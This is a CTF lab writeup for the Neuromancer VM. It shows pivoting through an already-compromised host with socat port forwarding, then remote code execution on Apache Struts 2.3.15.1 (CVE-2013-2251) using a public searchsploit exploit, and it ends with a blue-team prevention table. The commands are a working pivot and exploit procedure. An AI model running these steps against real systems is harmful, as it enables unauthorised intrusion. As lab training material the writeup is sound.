# CTF Writeup — Neuromancer (Chained from Straylight)

**Date:** 21 May 2026  
**Target:** Neuromancer VM (192.168.210.120)  
**Pivot Host:** Straylight (192.168.1.45) — already compromised  
**Attacker:** Kali Linux (192.168.1.21)  
**Goal:** Reach and exploit Neuromancer using Straylight as pivot + Apache Struts RCE

> ⚠️ Isolated lab environment. No real systems targeted.  
> This lab chains directly from the Straylight writeup — Neuromancer is only reachable through Straylight.

---

## Network Topology

```
[Kali] 192.168.1.21
    │
    │ (direct access)
    ▼
[Straylight] 192.168.1.45 / 192.168.210.x  ← pivot host (already rooted)
    │
    │ (host-only — not reachable from Kali directly)
    ▼
[Neuromancer] 192.168.210.120
```

---

## Step 1 — Port Scan from Straylight to Neuromancer

```bash
# On Straylight (already have shell here)
nc -nvz 192.168.210.120 1-10000
# Found open ports on Neuromancer including 8080 and 8009
```

---

## Step 2 — Port Forwarding via Socat

Since Kali cannot directly reach Neuromancer, use Straylight to forward ports:

```bash
# On Straylight — forward Neuromancer's ports to Straylight's IP
socat TCP-LISTEN:12001,fork TCP:192.168.210.120:8080 &
socat TCP-LISTEN:12002,fork TCP:192.168.210.120:8009 &

# Now Kali can reach Neuromancer via Straylight:
# Kali → 192.168.1.45:12001 → 192.168.210.120:8080
```

---

## Step 3 — Nmap via Port Forward

```bash
# From Kali — scan forwarded ports
nmap <straylight_ip> -p-
# Ports 12001 and 12002 now visible
```

---

## Step 4 — Web Application Discovery

```bash
# Browse to forwarded port in browser
http://192.168.1.45:12001

# Discovered: Apache Struts 2 showcase application
http://192.168.1.45:12001/struts2_2.3.15.1-showcase

# Read note on Neuromancer
# On Straylight terminal:
cd /root
cat note.txt
```

---

## Step 5 — Apache Struts 2 RCE (CVE-2013-2251)

**Vulnerability:** Apache Struts 2.3.15.1 — remote code execution via OGNL injection in action parameter.

```bash
# On Kali — find and use exploit
searchsploit struts 2
searchsploit -m linux/webapps/41570.py   # copy exploit locally

python2 41570.py
# Check usage/help

# Execute commands on Neuromancer via Struts exploit
python2 41570.py "http://192.168.1.45:12001/struts2_2.3.15.1-showcase/showcase.action" "ifconfig"
python2 41570.py "http://192.168.1.45:12001/struts2_2.3.15.1-showcase/showcase.action" "hostname"
```

**Result:** Remote code execution on Neuromancer achieved through Straylight pivot.

---

## Attack Chain Summary

```
1. Straylight compromised (LFI → log poison → RCE → root)
         ↓
2. Port scan from Straylight to find Neuromancer (192.168.210.120)
         ↓
3. Socat port forwarding through Straylight to expose Neuromancer services
         ↓
4. Apache Struts 2.3.15.1 RCE discovered on Neuromancer
         ↓
5. RCE via CVE-2013-2251 (OGNL injection) through the pivot
```

---

## Key Takeaways

1. **Chained attacks** — real environments require multiple hops; rarely is a high-value target directly exposed
2. **Socat port forwarding** is a simple, powerful pivoting technique using already-installed tools
3. **Apache Struts** vulnerabilities are historically critical — the 2017 Equifax breach used a Struts exploit
4. **Searchsploit** finds local exploits fast — critical when no internet access in engagement
5. **Pivoting expands your attack surface** — every compromised host becomes a new launch point

---

## Blue Team — Prevention

| Vector | Defence |
|--------|---------|
| Struts RCE | Patch Apache Struts immediately — subscribe to security advisories |
| Socat forwarding | Network segmentation, monitor unusual listening ports |
| Pivot via compromised host | Zero trust, EDR, restrict inter-segment traffic |
| Exposed internal services | Firewall internal segments, principle of least privilege |
